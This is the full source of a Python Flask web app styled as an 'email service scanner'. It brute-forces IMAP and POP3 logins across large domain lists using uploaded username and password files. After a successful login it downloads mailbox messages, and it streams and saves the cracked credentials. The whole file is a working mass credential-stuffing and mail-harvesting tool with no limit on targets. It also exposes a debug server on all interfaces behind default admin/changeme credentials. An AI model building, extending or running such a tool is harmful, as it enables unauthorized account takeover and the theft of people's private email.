#!/usr/bin/env python3
import os
import time
import json
import queue
import threading
import hashlib
import logging
import ssl
import socket
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import List, Tuple, Optional, Iterator, Dict, Any
from itertools import product
from concurrent.futures import ThreadPoolExecutor
from functools import wraps
import secrets
import flask
from flask import Flask, request, render_template_string, Response, jsonify
from imaplib import IMAP4, IMAP4_SSL
from poplib import POP3, POP3_SSL
import werkzeug

# -------------------- Configuration --------------------
app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_urlsafe(32))

# Enable logging to see what's happening on the server
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

BASIC_AUTH_USER = os.environ.get('SCANNER_USER', 'admin')
BASIC_AUTH_PASS = os.environ.get('SCANNER_PASS', 'changeme')

MAX_DOMAINS = 99999
MAX_USERNAMES = 9999
MAX_PASSWORDS = 9999
MAX_THREADS = 20
MAX_FETCH_MSGS = 100
DEFAULT_TIMEOUT = 10
DEFAULT_MAX_MSGS = 10
DEFAULT_THREADS = 1
HEARTBEAT_INTERVAL = 10
SCAN_OUTPUT = Path("scans")

@dataclass
class IMAPService:
    port: int
    use_ssl: bool
    use_starttls: bool

@dataclass
class POP3Service:
    port: int
    use_ssl: bool

IMAP_SERVICES = [
    IMAPService(143, False, True),
    IMAPService(993, True, False),
]

POP3_SERVICES = [
    POP3Service(110, False),
    POP3Service(995, True),
]

# -------------------- Authentication --------------------
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not (auth and auth.username == BASIC_AUTH_USER and auth.password == BASIC_AUTH_PASS):
            return Response('Authentication required\n', 401,
                            {'WWW-Authenticate': 'Basic realm="Email Scanner"'})
        return f(*args, **kwargs)
    return decorated

# -------------------- Structured Results --------------------
class AuthStatus:
    SUCCESS = "success"
    CONN_REFUSED = "connection_refused"
    TIMEOUT = "timeout"
    SSL_ERROR = "ssl_error"
    AUTH_FAILED = "auth_failed"
    PROTOCOL_ERROR = "protocol_error"
    UNKNOWN = "unknown"

@dataclass
class AuthAttempt:
    domain: str
    service: str
    port: int
    username: str
    password_hash: str
    status: str
    message_count: int = 0
    total_size: int = 0
    fetched: int = 0
    error_detail: str = ""
    elapsed: float = 0.0
    timestamp: float = field(default_factory=time.time)

@dataclass
class ServiceResult:
    service: str
    port: int
    encryption: str
    successes: List[AuthAttempt] = field(default_factory=list)
    failures: List[AuthAttempt] = field(default_factory=list)

@dataclass
class DomainResult:
    domain: str
    services: Dict[str, ServiceResult] = field(default_factory=dict)

# -------------------- Helper Functions --------------------
def safe_decode(data: bytes, max_len: int = 4096) -> str:
    return data[:max_len].decode('utf-8', errors='ignore')

def create_ssl_context(no_verify: bool) -> ssl.SSLContext:
    context = ssl.create_default_context()
    if no_verify:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    return context

# -------------------- Protocol Handlers --------------------
class IMAPHandler:
    @staticmethod
    def probe(domain: str, svc: IMAPService, timeout: int, no_verify: bool) -> Optional[str]:
        try:
            if svc.use_ssl:
                with IMAP4_SSL(domain, svc.port, timeout=timeout,
                               ssl_context=create_ssl_context(no_verify)):
                    return "SSL"
            else:
                with IMAP4(domain, svc.port, timeout=timeout) as conn:
                    if svc.use_starttls:
                        conn.starttls(ssl_context=create_ssl_context(no_verify))
                        return "STARTTLS"
                    return "plain"
        except Exception as e:
            logging.debug(f"IMAP probe failed for {domain}:{svc.port}: {e}")
            return None

    @staticmethod
    def attempt(domain: str, svc: IMAPService, username: str, password: str,
                timeout: int, no_verify: bool, fetch_emails: bool,
                max_msgs: int, fetch_all: bool) -> Tuple[str, AuthAttempt]:
        attempt = AuthAttempt(
            domain=domain,
            service="IMAP",
            port=svc.port,
            username=username,
            password_hash=hashlib.sha256(password.encode()).hexdigest()[:16],
            status=AuthStatus.UNKNOWN,
        )
        start = time.time()
        conn = None
        status = AuthStatus.UNKNOWN
        try:
            if svc.use_ssl:
                conn = IMAP4_SSL(domain, svc.port, timeout=timeout,
                                 ssl_context=create_ssl_context(no_verify))
            else:
                conn = IMAP4(domain, svc.port, timeout=timeout)
                if svc.use_starttls:
                    conn.starttls(ssl_context=create_ssl_context(no_verify))
            conn.login(username, password)
            status = AuthStatus.SUCCESS
            if fetch_emails:
                typ, data = conn.list()
                mailboxes = []
                for item in data:
                    decoded = safe_decode(item)
                    if decoded.startswith('* LIST'):
                        parts = decoded.split('"')
                        name = parts[1] if len(parts) >= 2 else decoded.split()[-1]
                    else:
                        name = decoded.split()[-1]
                    mailboxes.append(name.strip('"'))
                target = "INBOX" if "INBOX" in mailboxes else (mailboxes[0] if mailboxes else None)
                if target:
                    typ, data = conn.select(target)
                    msg_count = int(data[0]) if data and data[0] else 0
                    attempt.message_count = msg_count
                    if msg_count > 0:
                        fetch_limit = msg_count if fetch_all else min(msg_count, max_msgs)
                        fetched = 0
                        for i in range(1, fetch_limit + 1):
                            try:
                                typ, data = conn.fetch(str(i), "(RFC822)")
                                fetched += 1
                            except Exception as e:
                                logging.debug(f"Failed to fetch msg {i}: {e}")
                        attempt.fetched = fetched
            conn.close()
            conn.logout()
        except (IMAP4.abort, IMAP4.error, socket.error, ssl.SSLError) as e:
            attempt.error_detail = str(e)
            if isinstance(e, (socket.timeout, TimeoutError)):
                status = AuthStatus.TIMEOUT
            elif isinstance(e, ssl.SSLError):
                status = AuthStatus.SSL_ERROR
            elif isinstance(e, IMAP4.error) and "authentication failed" in str(e).lower():
                status = AuthStatus.AUTH_FAILED
            else:
                status = AuthStatus.PROTOCOL_ERROR
        except Exception as e:
            attempt.error_detail = str(e)
            status = AuthStatus.UNKNOWN
        finally:
            if conn:
                try:
                    conn.close()
                    conn.logout()
                except:
                    pass
            attempt.elapsed = time.time() - start
            attempt.status = status
        return status, attempt

class POP3Handler:
    @staticmethod
    def probe(domain: str, svc: POP3Service, timeout: int, no_verify: bool) -> Optional[str]:
        try:
            if svc.use_ssl:
                with POP3_SSL(domain, svc.port, timeout=timeout,
                              context=create_ssl_context(no_verify)):
                    return "SSL"
            else:
                with POP3(domain, svc.port, timeout=timeout):
                    return "plain"
        except Exception as e:
            logging.debug(f"POP3 probe failed for {domain}:{svc.port}: {e}")
            return None

    @staticmethod
    def attempt(domain: str, svc: POP3Service, username: str, password: str,
                timeout: int, no_verify: bool, fetch_emails: bool,
                max_msgs: int, fetch_all: bool, pop3_full: bool) -> Tuple[str, AuthAttempt]:
        attempt = AuthAttempt(
            domain=domain,
            service="POP3",
            port=svc.port,
            username=username,
            password_hash=hashlib.sha256(password.encode()).hexdigest()[:16],
            status=AuthStatus.UNKNOWN,
        )
        start = time.time()
        conn = None
        status = AuthStatus.UNKNOWN
        try:
            if svc.use_ssl:
                conn = POP3_SSL(domain, svc.port, timeout=timeout,
                                context=create_ssl_context(no_verify))
            else:
                conn = POP3(domain, svc.port, timeout=timeout)
            conn.user(username)
            conn.pass_(password)
            status = AuthStatus.SUCCESS
            if fetch_emails:
                msg_count, total_size = conn.stat()
                attempt.message_count = msg_count
                attempt.total_size = total_size
                if msg_count > 0:
                    fetch_limit = msg_count if fetch_all else min(msg_count, max_msgs)
                    fetched = 0
                    for i in range(1, fetch_limit + 1):
                        try:
                            if pop3_full:
                                lines = conn.retr(i)[1]
                            else:
                                lines = conn.top(i, 0)[1]
                            fetched += 1
                        except Exception as e:
                            logging.debug(f"Failed to fetch msg {i}: {e}")
                    attempt.fetched = fetched
            conn.quit()
        except (POP3.error_proto, socket.error, ssl.SSLError) as e:
            attempt.error_detail = str(e)
            if isinstance(e, (socket.timeout, TimeoutError)):
                status = AuthStatus.TIMEOUT
            elif isinstance(e, ssl.SSLError):
                status = AuthStatus.SSL_ERROR
            elif "-ERR" in str(e) and "auth" in str(e).lower():
                status = AuthStatus.AUTH_FAILED
            else:
                status = AuthStatus.PROTOCOL_ERROR
        except Exception as e:
            attempt.error_detail = str(e)
            status = AuthStatus.UNKNOWN
        finally:
            if conn:
                try:
                    conn.quit()
                except:
                    pass
            attempt.elapsed = time.time() - start
            attempt.status = status
        return status, attempt

# -------------------- Scanner Orchestrator --------------------
class Scanner:
    def __init__(self, domains: List[str], usernames: List[str], passwords: List[str],
                 timeout: int, max_msgs: int, threads: int,
                 fetch_all: bool, pop3_full: bool, no_ssl_verify: bool, fetch_emails: bool):
        self.domains = domains
        self.usernames = usernames
        self.passwords = passwords
        self.timeout = timeout
        self.max_msgs = max_msgs
        self.threads = min(threads, MAX_THREADS)
        self.fetch_all = fetch_all
        self.pop3_full = pop3_full
        self.no_ssl_verify = no_ssl_verify
        self.fetch_emails = fetch_emails

        self.total_creds = len(usernames) * len(passwords)
        self.event_queue = queue.Queue()
        self.stop_event = threading.Event()
        self.host_semaphore = threading.Semaphore(self.threads)

    def creds_iter(self) -> Iterator[Tuple[str, str]]:
        return product(self.usernames, self.passwords)

    def run(self):
        """Start scanning domains with thread pool."""
        logging.info("Scanner thread started")
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(self.scan_domain, domain) for domain in self.domains]
                for f in futures:
                    # Wait for each domain to complete, propagate exceptions
                    try:
                        f.result()
                    except Exception as e:
                        logging.error(f"Domain scan failed: {e}")
                        self.event_queue.put({"type": "error", "message": str(e)})
            self.event_queue.put({"type": "all_done"})
            logging.info("Scanner thread finished")
        except Exception as e:
            logging.error(f"Fatal error in scanner thread: {e}")
            self.event_queue.put({"type": "error", "message": f"Scanner thread crashed: {e}"})

    def scan_domain(self, domain: str):
        """Scan one domain: probe services, then try credentials."""
        logging.debug(f"Starting scan for domain: {domain}")
        # Probe services
        available_services = []
        for svc in IMAP_SERVICES:
            enc = IMAPHandler.probe(domain, svc, self.timeout, self.no_ssl_verify)
            if enc:
                available_services.append(('IMAP', svc, enc))
        for svc in POP3_SERVICES:
            enc = POP3Handler.probe(domain, svc, self.timeout, self.no_ssl_verify)
            if enc:
                available_services.append(('POP3', svc, enc))

        if not available_services:
            logging.debug(f"No services available for {domain}")
            self.event_queue.put({"type": "domain_done", "domain": domain, "result": None})
            return

        self.event_queue.put({"type": "domain_start", "domain": domain,
                              "services": [f"{proto}/{svc.port}" for proto, svc, enc in available_services]})

        domain_result = DomainResult(domain=domain)
        attempt_count = 0
        total_attempts = self.total_creds * len(available_services)

        for proto, svc, enc in available_services:
            svc_key = f"{proto}/{svc.port}"
            svc_result = ServiceResult(service=proto, port=svc.port, encryption=enc)
            domain_result.services[svc_key] = svc_result

            for username, password in self.creds_iter():
                if self.stop_event.is_set():
                    return
                attempt_count += 1
                with self.host_semaphore:
                    if proto == 'IMAP':
                        status, attempt = IMAPHandler.attempt(
                            domain, svc, username, password,
                            self.timeout, self.no_ssl_verify,
                            self.fetch_emails, self.max_msgs, self.fetch_all
                        )
                    else:
                        status, attempt = POP3Handler.attempt(
                            domain, svc, username, password,
                            self.timeout, self.no_ssl_verify,
                            self.fetch_emails, self.max_msgs, self.fetch_all, self.pop3_full
                        )

                # Emit progress AFTER EVERY attempt
                self.event_queue.put({
                    "type": "attempt",
                    "domain": domain,
                    "service": svc_key,
                    "current": attempt_count,
                    "total": total_attempts
                })

                if status == AuthStatus.SUCCESS:
                    svc_result.successes.append(attempt)
                    self._persist_success(domain, svc_key, username, attempt)
                    self.event_queue.put({
                        "type": "success",
                        "domain": domain,
                        "service": svc_key,
                        "credentials": f"{username}:{password}",
                        "msg_count": attempt.message_count,
                        "fetched": attempt.fetched,
                        "saved_to": str(SCAN_OUTPUT / domain / svc_key / username)
                    })
                else:
                    svc_result.failures.append(attempt)

        self.event_queue.put({"type": "domain_done", "domain": domain, "result": domain_result})
        logging.debug(f"Finished domain: {domain}")

    def _persist_success(self, domain: str, service: str, username: str, attempt: AuthAttempt):
        base = SCAN_OUTPUT / domain / service / username
        base.mkdir(parents=True, exist_ok=True)
        with open(base / "credentials.txt", 'w') as f:
            f.write(f"username: {username}\npassword_hash: {attempt.password_hash}\n")
        with open(base / "summary.json", 'w') as f:
            json.dump(asdict(attempt), f, indent=2)

# -------------------- SSE Event Stream --------------------
def event_stream(scanner: Scanner):
    """Generator that yields SSE messages."""
    logging.info("event_stream started")
    # Send start event
    start_msg = json.dumps({'total': len(scanner.domains)})
    yield f"event: start\ndata: {start_msg}\n\n"
    logging.info(f"Sent start event: {start_msg}")

    # Optionally send a test event to verify stream is working
    yield f"event: test\ndata: {{\"message\": \"SSE stream is alive\"}}\n\n"

    def scanner_thread():
        scanner.run()

    thread = threading.Thread(target=scanner_thread, daemon=True)
    thread.start()

    while True:
        try:
            msg = scanner.event_queue.get(timeout=HEARTBEAT_INTERVAL)
            logging.debug(f"Yielding event: {msg['type']}")
            yield f"event: {msg['type']}\ndata: {json.dumps(msg)}\n\n"
        except queue.Empty:
            logging.debug("Heartbeat")
            yield f"event: heartbeat\ndata: {time.time()}\n\n"
            if not thread.is_alive():
                logging.info("Scanner thread died, finishing stream")
                break
    yield "event: done\ndata: {}\n\n"
    logging.info("event_stream finished")

# -------------------- HTML Template (with debug console) --------------------
INDEX_HTML = """<!DOCTYPE html>
<html>
<head>
    <title>emailscanner · terminal</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; font-size: 14px; margin: 20px; }
        h1, h2 { color: #0f0; border-bottom: 1px solid #0f0; font-weight: normal; }
        form { border: 1px solid #0f0; padding: 15px; max-width: 800px; }
        label { display: inline-block; width: 150px; }
        input, textarea, select { background: #111; color: #0f0; border: 1px solid #0f0; padding: 5px; margin: 5px 0; width: 300px; }
        input[type="file"] { width: auto; }
        input[type="checkbox"] { width: auto; margin-left: 150px; }
        button { background: #000; color: #0f0; border: 2px solid #0f0; padding: 10px 20px; font-family: inherit; font-size: 16px; cursor: pointer; }
        button:hover { background: #0f0; color: #000; }
        .note { color: #888; font-size: 12px; }
        #progress, #successes { margin-top: 20px; border: 1px solid #0f0; padding: 10px; max-height: 400px; overflow-y: auto; background: #111; }
        #successes { max-height: 200px; }
        .hidden { display: none; }
        #debug { color: #888; font-size: 12px; margin-top: 10px; }
    </style>
</head>
<body>
    <h1>EMAIL SERVICE SCANNER</h1>
    <form id="scanForm" enctype="multipart/form-data">
        <label>Domains (textarea):</label><br>
        <textarea name="domains" rows="6" cols="50" placeholder="example.com"></textarea><br>
        <label>Or domains file:</label>
        <input type="file" name="domains_file" accept=".txt,.csv"><br>

        <label>Usernames file:</label>
        <input type="file" name="userfile" accept=".txt,.csv" required><br>
        <label>Passwords file:</label>
        <input type="file" name="passfile" accept=".txt,.csv" required><br>

        <label>Timeout (s):</label>
        <input type="number" name="timeout" value="10" min="1"><br>
        <label>Max msgs to fetch:</label>
        <input type="number" name="max_msgs" value="10" min="0" max="100"><br>
        <label>Threads:</label>
        <input type="number" name="threads" value="5" min="1" max="20"><br>

        <input type="checkbox" name="fetch_all" value="yes"> Fetch all messages<br>
        <input type="checkbox" name="pop3_full" value="yes"> POP3 full messages<br>
        <input type="checkbox" name="no_ssl_verify" value="yes"> Disable SSL verify<br>
        <input type="checkbox" name="fetch_emails" value="yes" checked> Fetch emails<br>

        <button type="submit">[ SCAN ]</button>
    </form>

    <div id="progress" class="hidden"><h2>PROGRESS</h2><pre id="log"></pre></div>
    <div id="successes" class="hidden"><h2>SUCCESSES</h2><pre id="success-log"></pre></div>
    <div id="debug">Waiting for progress...</div>

    <script>
        const MAX_LOG = 200;
        let logLines = [];
        function addLog(line) {
            logLines.push(line);
            if(logLines.length > MAX_LOG) logLines.shift();
            document.getElementById('log').textContent = logLines.join('\\n');
            document.getElementById('debug').textContent = 'Last event: ' + line.substring(0, 50) + '...';
        }

        document.getElementById('scanForm').addEventListener('submit', async (e)=>{
            e.preventDefault();
            const form = e.target;
            const formData = new FormData(form);
            document.getElementById('progress').classList.remove('hidden');
            document.getElementById('successes').classList.remove('hidden');
            document.getElementById('log').textContent = '';
            document.getElementById('success-log').textContent = '';
            document.getElementById('debug').textContent = 'Connecting...';
            logLines = [];

            // Set a timeout to show if no events received
            let noEventTimeout = setTimeout(() => {
                addLog('[DEBUG] No events received in 3 seconds. Check console (F12).');
            }, 3000);

            try {
                const response = await fetch('/scan', { method:'POST', body:formData });
                const reader = response.body.getReader();
                const decoder = new TextDecoder();
                let buffer = '';
                while(true) {
                    const {done, value} = await reader.read();
                    if(done) break;
                    buffer += decoder.decode(value, {stream:true});
                    const events = buffer.split('\\n\\n');
                    buffer = events.pop();
                    for(const event of events) {
                        if(!event.trim()) continue;
                        // Log raw event to console for debugging
                        console.log('RAW EVENT:', event);
                        const lines = event.split('\\n');
                        const ev = lines[0].replace('event: ','');
                        const dataStr = lines[1].replace('data: ','');
                        try {
                            const data = JSON.parse(dataStr);
                            // Clear the no-event timeout on first event
                            clearTimeout(noEventTimeout);
                            handleEvent(ev, data);
                        } catch (parseErr) {
                            console.error('Failed to parse event data:', dataStr, parseErr);
                            addLog(`[PARSE ERROR] Could not parse: ${dataStr.substring(0,50)}...`);
                        }
                    }
                }
            } catch(err) {
                addLog(`[NETWORK ERROR] ${err.message}`);
                console.error(err);
            }
        });

        function handleEvent(ev, data) {
            if(ev==='start') addLog(`[INFO] Scanning ${data.total} domains...`);
            else if(ev==='test') addLog(`[DEBUG] ${data.message}`);
            else if(ev==='domain_start') addLog(`\\n[INFO] Scanning ${data.domain} (services: ${data.services.join(', ')})`);
            else if(ev==='attempt') addLog(`[${data.domain} ${data.service}] attempt ${data.current}/${data.total}`);
            else if(ev==='success') {
                addLog(`[SUCCESS] ${data.domain} ${data.service} - ${data.credentials} msgs:${data.msg_count} fetched:${data.fetched}`);
                document.getElementById('success-log').textContent += `${data.domain} | ${data.service} | ${data.credentials} | saved: ${data.saved_to}\\n`;
            }
            else if(ev==='heartbeat') { /* ignore */ }
            else if(ev==='done') addLog('\\n[INFO] Scan complete.');
        }
    </script>
</body>
</html>
"""

# -------------------- Flask Routes --------------------
@app.route('/')
@require_auth
def index():
    return render_template_string(INDEX_HTML)

@app.route('/scan', methods=['POST'])
@require_auth
def scan():
    logging.info("Received /scan request")
    domains = []
    domains_text = request.form.get('domains', '').strip()
    if domains_text:
        domains.extend([line.strip() for line in domains_text.splitlines() if line.strip()])

    domains_file = request.files.get('domains_file')
    if domains_file and domains_file.filename:
        try:
            content = domains_file.read().decode('utf-8')
            domains.extend([line.strip() for line in content.splitlines() if line.strip()])
        except Exception as e:
            logging.error(f"Error reading domains file: {e}")
            return jsonify({"error": f"Error reading domains file: {e}"}), 400

    if not domains:
        return jsonify({"error": "No domains provided"}), 400
    if len(domains) > MAX_DOMAINS:
        return jsonify({"error": f"Too many domains (max {MAX_DOMAINS})"}), 400

    user_file = request.files.get('userfile')
    if not user_file:
        return jsonify({"error": "Usernames file required"}), 400
    try:
        usernames = [line.decode('utf-8').strip() for line in user_file.stream.read().splitlines() if line.strip()]
    except Exception as e:
        return jsonify({"error": f"Error reading usernames: {e}"}), 400
    if len(usernames) > MAX_USERNAMES:
        return jsonify({"error": f"Too many usernames (max {MAX_USERNAMES})"}), 400

    pass_file = request.files.get('passfile')
    if not pass_file:
        return jsonify({"error": "Passwords file required"}), 400
    try:
        passwords = [line.decode('utf-8').strip() for line in pass_file.stream.read().splitlines() if line.strip()]
    except Exception as e:
        return jsonify({"error": f"Error reading passwords: {e}"}), 400
    if len(passwords) > MAX_PASSWORDS:
        return jsonify({"error": f"Too many passwords (max {MAX_PASSWORDS})"}), 400

    timeout = int(request.form.get('timeout', DEFAULT_TIMEOUT))
    max_msgs = int(request.form.get('max_msgs', DEFAULT_MAX_MSGS))
    threads = int(request.form.get('threads', DEFAULT_THREADS))
    fetch_all = 'fetch_all' in request.form
    pop3_full = 'pop3_full' in request.form
    no_ssl_verify = 'no_ssl_verify' in request.form
    fetch_emails = 'fetch_emails' in request.form

    max_msgs = min(max_msgs, MAX_FETCH_MSGS)
    threads = min(threads, MAX_THREADS)

    logging.info(f"Creating scanner with {len(domains)} domains, {len(usernames)} users, {len(passwords)} passwords")
    scanner = Scanner(domains, usernames, passwords, timeout, max_msgs, threads,
                      fetch_all, pop3_full, no_ssl_verify, fetch_emails)

    return Response(event_stream(scanner), mimetype='text/event-stream')

if __name__ == '__main__':
    SCAN_OUTPUT.mkdir(exist_ok=True)
    # Run with debug=True to see detailed logs (but disable in production)
    app.run(host='0.0.0.0', port=5000, threaded=True, debug=True)
